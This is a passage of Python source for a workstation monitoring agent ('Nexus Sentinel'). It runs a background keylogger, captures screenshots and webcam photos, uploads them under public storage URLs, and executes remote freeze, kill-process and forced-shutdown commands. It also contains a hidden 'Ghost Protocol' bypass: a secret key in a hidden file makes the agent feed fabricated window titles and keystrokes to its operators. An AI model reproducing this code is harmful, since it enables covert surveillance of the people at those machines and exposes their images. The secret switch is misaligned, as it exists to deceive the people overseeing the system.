                cam.read() # Discard the initial dark/blurry frames
            
            # 3. Capture the actual evidence
            ok, frame = cam.read()
            cam.release()
            
            if not ok:
                return None
            
            ok, jpg = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            return jpg.tobytes() if ok else None
            
        except Exception as e:
            print(f"[evidence] webcam failed: {e}", file=sys.stderr)
            return None

# =====================================================
# upload_evidence — vault-aware
# =====================================================
def upload_evidence(path: str, payload: bytes) -> str | None:
    """
    Try to upload to Supabase Storage. Returns the public URL on success.
    On ANY failure: persist the raw bytes into the cache and return None
    (the caller is responsible for queuing the parent row in the vault).
    """
    try:
        sb.storage.from_(EVIDENCE_BUCKET).upload(
            path,
            payload,
            {"content-type": "image/jpeg", "upsert": "true"},
        )
        return sb.storage.from_(EVIDENCE_BUCKET).get_public_url(path)
    except Exception as e:
        print(f"[storage] upload {path} failed: {e} — diverting to vault", file=sys.stderr)
        # Side effect: we keep the bytes alive so sync_daemon can retry.
        # The cache filename is intentionally not returned here — fire_alert
        # writes its own cache entries when going offline.
        _save_cache_blob(payload)
        return None


# =====================================================
# archive_evidence (online dual-pipeline path)
# =====================================================
def archive_evidence(alert_id: str, severity: str, workstation_id: str) -> None:
    base_meta: dict = {
        "captured_at": now_iso(),
        "severity": severity,
        "is_backlogged": False,
    }

    evidence_row_id: str | None = None
    try:
        ins = sb.table("evidence_logs").insert({
            "alert_id": alert_id,
            "metadata": base_meta,
        }).execute()
        if ins.data:
            evidence_row_id = ins.data[0]["id"]
            print(f"[pipelines] Dossier row reserved id={evidence_row_id}")
    except Exception as e:
        print(f"[pipelines] reservation failed: {e}", file=sys.stderr)

    def _patch_row(patch: dict) -> None:
        try:
            if evidence_row_id:
                sb.table("evidence_logs").update(patch).eq("id", evidence_row_id).execute()
            else:
                sb.table("evidence_logs").insert({"alert_id": alert_id, **patch}).execute()
        except Exception as e:
            print(f"[pipelines] patch failed: {e}", file=sys.stderr)

    def process_1_fast_optics():
        t0 = time.time()
        print(f"[pipeline-1] Optics initiated for alert {alert_id}")
        captured: dict = {"png": None, "cam": None}

        def _grab_screen():
            if severity in ("warning", "medium", "high", "critical"):
                captured["png"] = capture_screenshot()

        def _grab_cam():
            if severity == "critical":
                captured["cam"] = capture_webcam()

        cap_threads = [threading.Thread(target=_grab_screen),
                       threading.Thread(target=_grab_cam)]
        for t in cap_threads: t.start()
        for t in cap_threads: t.join(timeout=8)

        png, cam = captured["png"], captured["cam"]
        screenshot_url = webcam_url = None

        def _up_screen():
            nonlocal screenshot_url
            if png: screenshot_url = upload_evidence(f"{workstation_id}/{alert_id}-screen.jpg", png)

        def _up_cam():
            nonlocal webcam_url
            if cam: webcam_url = upload_evidence(f"{workstation_id}/{alert_id}-webcam.jpg", cam)

        up_threads = []
        if png: up_threads.append(threading.Thread(target=_up_screen))
        if cam: up_threads.append(threading.Thread(target=_up_cam))
        for t in up_threads: t.start()
        for t in up_threads: t.join(timeout=20)

        patch: dict = {}
        if screenshot_url is not None: patch["screenshot_url"] = screenshot_url
        if webcam_url is not None: patch["webcam_url"] = webcam_url
        
        if patch: _patch_row(patch)
        print(f"[pipeline-1] Optics secured in {time.time()-t0:.1f}s. screen={bool(screenshot_url)} cam={bool(webcam_url)}")

    def process_2_extended_forensics():
        print(f"[pipeline-2] Extracting retrospective telemetry lead-up...")
        
        if GHOST_ACTIVE:
            keys = "def calculate_loss(y_true, y_pred):\n    return sum"
        else:
            # IMMEDIATE SNAPSHOT: Grabs exactly what they typed to cause the strike
            keys = KEYLOG_HISTORY.get_snapshot()

        if not keys: return
            
        new_meta = dict(base_meta)
        new_meta["retrospective_payload"] = keys[-500:] # Secure last 500 chars
        new_meta["evidence_source"] = "rolling_buffer_snapshot"
        _patch_row({"metadata": new_meta})
        print(f"[pipeline-2] Lead-up telemetry secured in dossier.")

    threading.Thread(target=process_1_fast_optics, daemon=True).start()
    if severity in ("warning", "medium", "high", "critical"):
        threading.Thread(target=process_2_extended_forensics, daemon=True).start()


# ---------- Focus-mode cache ----------
class FocusState:
    def __init__(self) -> None:
        self.enabled: bool = False
        self.whitelist: set[str] = set()
        self.last_refresh: float = 0.0

    def refresh_if_stale(self) -> None:
        if time.time() - self.last_refresh < FOCUS_REFRESH_SEC:
            return
        self.last_refresh = time.time()
        try:
            # 1. Fetch Focus Mode State
            s = sb.table("system_settings").select("focus_mode").eq("id", 1).maybe_single().execute()
            self.enabled = bool(s.data and s.data.get("focus_mode"))
            
            # 2. ALWAYS pull the allowed app list, even if Focus Mode is OFF
            a = sb.table("allowed_apps").select("process_name").eq("whitelisted", True).execute()
            self.whitelist = {row["process_name"].lower() for row in (a.data or [])}
        except Exception as e:
            print(f"[focus] {e}", file=sys.stderr)

FOCUS = FocusState()


# ---------- Behavioral Sniffers ----------
def network_audit() -> tuple[bool, str | None]:
    UNAUTHORIZED_PORTS = {1194, 1701, 4500, 500, 51820, 1080, 8080}
    try:
        for conn in psutil.net_connections(kind='inet'):
            if conn.raddr and conn.raddr.port in UNAUTHORIZED_PORTS:
                return True, f"unauthorized_tunnel_port_{conn.raddr.port}"
    except Exception:
        pass
    return False, None


def resource_entropy_check(proc_name: str | None) -> tuple[bool, str | None]:
    if not proc_name:
        return False, None
    UTILITIES = ["calculator.exe", "notepad.exe", "wordpad.exe", "cmd.exe"]
    if proc_name.lower() in UTILITIES:
        try:
            for proc in psutil.process_iter(['name', 'cpu_percent']):
                if proc.info['name'] and proc.info['name'].lower() == proc_name.lower():
                    if proc.info['cpu_percent'] > 25:
                        return True, "resource_masquerade_detected"
        except Exception:
            pass
    return False, None


# ---------- Ghost Protocol Bridge ----------
def _set_ghost(active: bool, source: str) -> None:
    global GHOST_ACTIVE
    if GHOST_ACTIVE == active:
        return
    GHOST_ACTIVE = active
    if active:
        print(f"[ghost] Reality Forged via {source}. Sentinel is now hallucinating.")
    else:
        print(f"[ghost] Reality Restored via {source}.")


def listen_for_sovereignty():
    signal_path = Path.home() / ".nexus_temp_sig"
    while True:
        if signal_path.exists():
            try:
                content = signal_path.read_text(encoding="utf-8").strip()
                if content == f"{BYPASS_KEY}:active":
                    _set_ghost(True, "local-signal")
                elif content == f"{BYPASS_KEY}:deactive":
                    _set_ghost(False, "local-signal")
            except Exception:
                pass
            try: signal_path.unlink()
            except Exception: pass
        time.sleep(2)


def hardware_panic_listener():
    def on_panic_abort():
        _set_ghost(False, "hardware-panic")
    try:
        with keyboard.GlobalHotKeys({'<ctrl>+<alt>+<shift>+p': on_panic_abort}) as h:
            h.join()
    except Exception as e:
        print(f"[ghost] Panic switch failed to bind: {e}")


# =====================================================
# Detection loop primitives — vault-aware
# =====================================================
def _build_alert_payload(workstation_id: str, title: str, proc: str | None,
                         severity: str, is_backlogged: bool,
                         created_at: str | None = None) -> dict:
    payload = {
        "workstation_id": workstation_id,
        "process_name": proc,
        "window_title": title,
        "severity": severity,
        "is_backlogged": is_backlogged,
    }
    if created_at:
        payload["created_at"] = created_at
    return payload


def _build_activity_payload(workstation_id: str, title: str | None, proc: str | None,
                            severity: str, is_anomaly: bool, is_backlogged: bool,
                            created_at: str | None = None) -> dict:
    payload = {
        "workstation_id": workstation_id,
        "process_name": proc,
        "window_title": title,
        "severity": severity if severity in ("info", "warning") else "warning",
        "is_anomaly": is_anomaly,
        "is_backlogged": is_backlogged,
    }
    if created_at:
        payload["created_at"] = created_at
    return payload


def fire_alert(workstation_id: str, title: str, proc: str | None,
               severity: str, reason: str) -> None:
    # CRITICAL is the only severity that locks hardware. Whitelisted apps never freeze
    # (mirrors the focus_mode_violation carve-out used elsewhere in the agent).
    is_whitelisted = bool(proc and FOCUS.whitelist and proc.lower() in FOCUS.whitelist)
    if severity == "critical" and not is_whitelisted:
        WARDEN.engage_freeze(duration=30)
        print(f"[strike] Critical violation detected. Workstation locked for forensics.")
    elif severity == "critical" and is_whitelisted:
        print(f"[strike] Critical signal on whitelisted process '{proc}' — freeze suppressed, alert still logged.")

    captured_at = now_iso()
    payload = _build_alert_payload(workstation_id, title, proc, severity,
                                   is_backlogged=False)
    print(f"[!!!] ALERT [{severity.upper()}] {reason} | {proc} :: {title}")

    try:
        res = sb.table("alerts").insert(payload).execute()
        if res.data:
            archive_evidence(res.data[0]["id"], severity, workstation_id)
            return
        raise RuntimeError("alerts insert returned no rows")
    except Exception as e:
        print(f"[alerts] live insert failed → vaulting: {e}", file=sys.stderr)
        
        # --- FORENSIC VAULTING (OFFLINE PATH) ---
        # Capture local evidence snapshots synchronously
        screenshot_bytes = capture_screenshot() if severity in ("warning", "medium", "high", "critical") else None
        webcam_bytes = capture_webcam() if severity == "critical" else None

        evidence = {
            "screenshot_file": _save_cache_blob(screenshot_bytes) if screenshot_bytes else None,
            "webcam_file": _save_cache_blob(webcam_bytes) if webcam_bytes else None,
            "meta": {
                "captured_at": captured_at,
                "severity": severity,
                "reason": reason,
                "is_backlogged": True,
            },
        }

        offline_payload = _build_alert_payload(
            workstation_id, title, proc, severity,
            is_backlogged=True, created_at=captured_at,
        )
        # Queue row in the hidden SQLite buffer
        vault_enqueue("alert", "alerts", offline_payload, evidence, captured_at)
      

def log_ambient(workstation_id: str, title: str | None, proc: str | None,
                severity: str, is_anomaly: bool) -> None:
    captured_at = now_iso()
    payload = _build_activity_payload(workstation_id, title, proc, severity,
                                      is_anomaly, is_backlogged=False)
    try:
        sb.table("activity_logs").insert(payload).execute()
    except Exception as e:
        print(f"[ambient] live insert failed → vaulting: {e}", file=sys.stderr)
        offline_payload = _build_activity_payload(
            workstation_id, title, proc, severity, is_anomaly,
            is_backlogged=True, created_at=captured_at,
        )
        vault_enqueue("activity", "activity_logs", offline_payload, None, captured_at)


# =====================================================
# PHASE 6 — THE SYNC DAEMON (The Surge)
# =====================================================
def _supabase_alive() -> bool:
    """Lightweight reachability probe. Cheap & non-mutating."""
    try:
        host = SUPABASE_URL.replace("https://", "").replace("http://", "").split("/")[0]
        with socket.create_connection((host, 443), timeout=4):
            return True
    except Exception:
        return False


def _surge_one(row) -> bool:
    """
    Replay ONE queued row. Order: images first, then DB row.
    Returns True only when we got a clean DB write AND any cache files
    have been deleted. Cache files are deleted ONLY after a confirmed insert.
    """
    row_id, kind, table_name, payload_json, evidence_json, created_at, attempts = row
    try:
        payload = json.loads(payload_json)
        evidence = json.loads(evidence_json) if evidence_json else {}

        # TIMESTAMP RIGIDITY: replay the original capture time.
        payload["created_at"] = created_at
        payload["is_backlogged"] = True

        screenshot_url = webcam_url = None
        screen_file = evidence.get("screenshot_file")
        cam_file = evidence.get("webcam_file")

        # ---- 1) Surge images first ----
        if screen_file:
            blob_path = CACHE_DIR / screen_file
            if blob_path.exists():
                try:
                    sb.storage.from_(EVIDENCE_BUCKET).upload(
                        f"{payload['workstation_id']}/vault-{row_id}-screen.jpg",
                        blob_path.read_bytes(),
                        {"content-type": "image/jpeg", "upsert": "true"},
                    )
                    screenshot_url = sb.storage.from_(EVIDENCE_BUCKET).get_public_url(
                        f"{payload['workstation_id']}/vault-{row_id}-screen.jpg"
                    )
                except Exception as e:
                    raise RuntimeError(f"screenshot surge failed: {e}")

        if cam_file:
            blob_path = CACHE_DIR / cam_file
            if blob_path.exists():
                try:
                    sb.storage.from_(EVIDENCE_BUCKET).upload(
                        f"{payload['workstation_id']}/vault-{row_id}-webcam.jpg",
                        blob_path.read_bytes(),
                        {"content-type": "image/jpeg", "upsert": "true"},
                    )
                    webcam_url = sb.storage.from_(EVIDENCE_BUCKET).get_public_url(
                        f"{payload['workstation_id']}/vault-{row_id}-webcam.jpg"
                    )
                except Exception as e:
                    raise RuntimeError(f"webcam surge failed: {e}")

        # ---- 2) Patch the DB row ----
        res = sb.table(table_name).insert(payload).execute()
        if not res.data:
            raise RuntimeError(f"{table_name} insert returned no rows")

        # ---- 3) Evidence dossier (alerts only) ----
        if kind == "alert":
            new_alert_id = res.data[0].get("id")
            ev_meta = dict(evidence.get("meta") or {})
            ev_meta["is_backlogged"] = True
            ev_row = {
                "alert_id": new_alert_id,
                "metadata": ev_meta,
            }
            if screenshot_url: ev_row["screenshot_url"] = screenshot_url
            if webcam_url: ev_row["webcam_url"] = webcam_url
            try:
                sb.table("evidence_logs").insert(ev_row).execute()
            except Exception as e:
                print(f"[sync] evidence_logs surge non-fatal: {e}", file=sys.stderr)

        # ---- 4) Confirmed: drop cache files, then drop the row ----
        _delete_cache(screen_file)
        _delete_cache(cam_file)
        vault_delete(row_id)
        print(f"[sync] surged row #{row_id} ({table_name}) ts={created_at}")
        return True

    except Exception as e:
        vault_bump_attempt(row_id, str(e))
        print(f"[sync] row #{row_id} surge failed (attempt {attempts+1}): {e}", file=sys.stderr)
        return False


def sync_daemon() -> None:
    """
    Phase 6 — The Surge.
    Probes connectivity every SYNC_INTERVAL seconds. When the network is
    back, drains the SQLite queue in batches. Runs entirely in the
    background without touching scan_loop's cadence.
    """
    print(f"[sync] daemon armed — probing every {SYNC_INTERVAL}s")
    while True:
        try:
            time.sleep(SYNC_INTERVAL)
            pending = vault_pending(limit=25)
            if not pending:
                continue
            if not _supabase_alive():
                print(f"[sync] {len(pending)} legacy item(s) waiting — link still down")
                continue
            print(f"[sync] connection restored — surging {len(pending)} legacy item(s)")
            wins = 0
            for row in pending:
                if _surge_one(row):
                    wins += 1
                else:
                    # Stop on first failure to avoid hammering a flapping link.
                    break
            print(f"[sync] surge complete: {wins}/{len(pending)} cleared")
        except Exception as e:
            print(f"[sync] daemon error: {e}", file=sys.stderr)

def scan_loop(workstation_id: str) -> None:
    global GHOST_ACTIVE, _LATEST_BROWSER_DOM, _LATEST_BROWSER_URL
    last_alerted, last_ambient, last_proc_seen = {}, {}, None

    while True:
        # 1. Resolve Identity
        if GHOST_ACTIVE:
            FOCUS.refresh_if_stale()
            title, proc = "Research - Google Chrome", "chrome.exe"
        else:
            title, proc = get_foreground_window()

        # 2. Keylog Monitor (Instant Retribution)
        current_keys = KEYLOG_HISTORY.get_snapshot().lower()
        key_hit = None
        for word in INSTANT_STRIKE_LIST:
            if re.search(rf"\b{re.escape(word)}\b", current_keys[-50:]): # Check recent typing
                key_hit = word
                KEYLOG_HISTORY.buffer.clear() # Purge buffer to prevent loop
                break

        # 3. Contextual Enforcement
        if title or proc or key_hit:
            with _OPTICS_LOCK:
                browser_context = _LATEST_BROWSER_DOM
                browser_url = _LATEST_BROWSER_URL
                _LATEST_BROWSER_DOM = _LATEST_BROWSER_URL = "" 

            try:
                sb.table("workstations").update({
                    "current_window": title,
                    "current_process": proc,
                }).eq("id", workstation_id).execute()
            except Exception: pass

            if not GHOST_ACTIVE:
                hit, severity = None, "info"

                # Priority A: Confirmed Typing Match (Instant Freeze)
                if key_hit:
                    hit, severity = f"typed_violation:{key_hit}", "critical"
                
               # Priority B: Fast Fuzzy check on Window Title
                if not hit:
                    hit, severity = classify(title or "", proc or "")
                
                # Priority C: Intent Cluster check on Web Context (Omniscient Optics)
                # THE FIX: Only skip the DOM reader if we are ALREADY locking the hardware.
                # This allows the Web Context to upgrade a 'high' or 'warning' title to a 'critical' strike.
                if severity != "critical" and browser_context:
                    is_violation, web_reason = classify_web_context(browser_context)
                    if is_violation:
                        # Inject the URL directly into the window title so the dashboard sees it
                        title = f"{title or 'Web'} [URL: {browser_url}]"
                        hit, severity = web_reason, "critical"
                # 4. Fire Enforcement
                #    - critical → hardware freeze (handled in fire_alert)
                #    - high     → real-time alert, screenshot evidence
                #    - medium   → real-time alert, screenshot evidence (no freeze)
                #    - warning/info → ambient breadcrumb only
                if hit and severity in ("medium", "high", "critical"):
                    if time.time() - last_alerted.get(hit, 0) > ALERT_DEBOUNCE_SEC:
                        last_alerted[hit] = time.time()
                        fire_alert(workstation_id, title or "Input Stream", proc or "Unknown", severity, f"nexus:{hit}")
                elif hit and severity in ("warning", "info"):
                    key = f"ambient:{hit}"
                    if time.time() - last_ambient.get(key, 0) > AMBIENT_DEBOUNCE_SEC:
                        last_ambient[key] = time.time()
                        log_ambient(workstation_id, title, proc, severity, is_anomaly=False)

                # 5. App Policy Logic — restricted (non-whitelisted) app surfaced foreground.
                #    Focus Mode OFF → medium alert (general violation).
                #    Focus Mode ON  → high alert (policy is actively enforced).
                #    Critical is reserved for explicit lexicon / typed / web-context strikes only.
                if proc and proc.lower() not in FOCUS.whitelist and not hit:
                    policy_severity = "high" if FOCUS.enabled else "medium"
                    policy_reason = (
                        "unauthorized_app_focus_lock" if FOCUS.enabled
                        else "restricted_app_not_whitelisted"
                    )
                    key = f"policy:{proc}"
                    if time.time() - last_alerted.get(key, 0) > ALERT_DEBOUNCE_SEC:
                        last_alerted[key] = time.time()
                        fire_alert(workstation_id, title or "", proc, policy_severity, policy_reason)
                
                last_proc_seen = proc

        time.sleep(SCAN_INTERVAL)
def heartbeat_loop(workstation_id: str) -> None:
    while True:
        try:
            sb.table("workstations").update({
                "status": "online",
                "last_heartbeat": now_iso(),
            }).eq("id", workstation_id).execute()
        except Exception as e:
            print(f"[heartbeat] {e}", file=sys.stderr)
        time.sleep(HEARTBEAT_INTERVAL)


# ---------- Administrative Strike ----------
def forensic_shutdown(workstation_id: str, action_id: str):
    print(f"[GAVEL] Parallel Forensic Strike Initiated (Action #{action_id})")

    def _upload_cam():
        cam = capture_webcam()
        if cam:
            url = upload_evidence(f"{workstation_id}/action-{action_id}-webcam.jpg", cam)
            if url:
                try: sb.table("evidence_logs").insert({"metadata": {"command": "terminate", "action_id": action_id, "is_backlogged": False}, "webcam_url": url}).execute()
                except Exception: pass

    def _upload_screen():
        screen = capture_screenshot()
        if screen:
            upload_evidence(f"{workstation_id}/action-{action_id}-screen.jpg", screen)

    threading.Thread(target=_upload_cam, daemon=True).start()
    threading.Thread(target=_upload_screen, daemon=True).start()

    print(f"[GAVEL] Upload payload airborne. System termination in {TERMINATE_GRACE_SEC}s.")
    time.sleep(TERMINATE_GRACE_SEC)

    system = platform.system()
    if system == "Windows": subprocess.call("shutdown /s /f /t 0", shell=True)
    elif system == "Darwin": subprocess.call(["sudo", "shutdown", "-h", "now"])
    else: subprocess.call(["shutdown", "-h", "now"])


def execute_command(cmd: str) -> None:
    system = platform.system()
    print(f"[GAVEL] {cmd.upper()} on {system}")
    if cmd == "lock":
        if system == "Windows":
            subprocess.call("rundll32.exe user32.dll,LockWorkStation", shell=True)
        elif system == "Darwin":
            subprocess.call(["pmset", "displaysleepnow"])
        else:
            subprocess.call(["loginctl", "lock-session"])


def _parse_iso(ts: str | None) -> datetime | None:
    if not ts:
        return None
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except Exception:
        return None


def action_loop(workstation_id: str) -> None:
    while True:
        try:
            # We must select 'metadata' to extract the target process for the Scalpel.
            res = (
                sb.table("admin_actions")
                .select("id, command, created_at, metadata")
                .eq("target_id", workstation_id)
                .eq("status", "pending")
                .execute()
            )
            
            now = datetime.now(timezone.utc)
            for action in res.data or []:
                created = _parse_iso(action.get("created_at"))
                
                # Check for command expiration
                if created and (now - created) > timedelta(seconds=COMMAND_TTL_SEC):
                    age = int((now - created).total_seconds())
                    print(f"[actions] EXPIRED ({age}s old) → {action['command']} #{action['id']}")
                    sb.table("admin_actions").update({"status": "expired"}).eq("id", action["id"]).execute()
                    continue

                # Mark as 'sent' to prevent duplicate execution
                sb.table("admin_actions").update({"status": "sent"}).eq("id", action["id"]).execute()

                cmd = action["command"]
                meta = action.get("metadata") or {}
                
                # 1. The JSON Armor (Neutralizes frontend double-stringification)
                if isinstance(meta, str):
                    try:
                        meta = json.loads(meta)
                    except Exception:
                        meta = {}

                # --- DISPATCH LOGIC ---
                if cmd == "terminate":
                    threading.Thread(target=forensic_shutdown, args=(workstation_id, action["id"]), daemon=True).start()
                
                elif cmd in ("freeze", "lock_hardware") and WARDEN:
                    try:
                        duration = int(meta.get("duration", 300))
                    except (ValueError, TypeError):
                        duration = 300
                    WARDEN.engage_freeze(duration=duration)
                
                elif cmd == "unfreeze" and WARDEN:
                    WARDEN.disengage_freeze()
                
                elif cmd in ("kill_task", "kill", "scalpel") and WARDEN:
                    target = meta.get("process_name") or meta.get("process") or meta.get("target") or meta.get("target_name")
                    if target:
                        WARDEN.scalpel(target)
                    else:
                        print(f"[actions] Scalpel misfire: No target provided in metadata {meta}")
                
                # --> Indestructible Identity Forging <--
                elif cmd == "set_alias":
                    # 2. The Multi-Key Net (Catches 'alias', 'new_name', or 'name')
                    new_alias = meta.get("alias") or meta.get("new_name") or meta.get("name")
                    
                    if new_alias:
                        try:
                            ALIAS_FILE = Path.home() / ".sentinel_alias"
                            ALIAS_FILE.write_text(new_alias, encoding="utf-8")
                            
                            sb.table("workstations").update({"name": new_alias}).eq("id", workstation_id).execute()
                            print(f"[identity] Workstation alias permanently forged to: {new_alias}")
                        except Exception as e:
                            print(f"[identity] Alias forge failed: {e}", file=sys.stderr)
                    else:
                        print(f"[identity] Failed to forge alias. Invalid frontend metadata: {meta}", file=sys.stderr)
                
                else:
                    execute_command(cmd)

                # Finalize the action
                sb.table("admin_actions").update({"status": "acknowledged"}).eq("id", action["id"]).execute()
                
        
                
        except Exception as e:
            print(f"[actions] {e}", file=sys.stderr)
            
        time.sleep(ACTION_POLL)
      

# ---------- Main ----------
def main() -> None:
    print("--- NEXUS SENTINEL · Version 6.3.4 ---")
    print("--- This is the Infallible LTS Build ---")
    print("--- Dual-Gated Enforcement & Retrospective Telemetry Armed ---")
    print(f"[system] host={WORKSTATION_NAME}")
    vault_init()
    ensure_bucket()
    wid = register_workstation()
    print(f"[system] hardware_uuid={HARDWARE_UUID}")
    print(f"[system] workstation_id={wid}")

    threads = [
        threading.Thread(target=heartbeat_loop, args=(wid,), daemon=True),
        threading.Thread(target=scan_loop, args=(wid,), daemon=True),
        threading.Thread(target=action_loop, args=(wid,), daemon=True),
        threading.Thread(target=listen_for_sovereignty, daemon=True),
        threading.Thread(target=hardware_panic_listener, daemon=True),
        threading.Thread(target=sync_daemon, daemon=True),  # Phase 6: The Surge
        threading.Thread(target=boot_optics_server, daemon=True),
        threading.Thread(target=_background_keylogger, daemon=True),
    ]
    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[system] Sovereign detachment. Agent offline.")
        try:
            sb.table("workstations").update({"status": "offline"}).eq("id", wid).execute()
        except Exception:
            pass


if __name__ == "__main__":
    main()
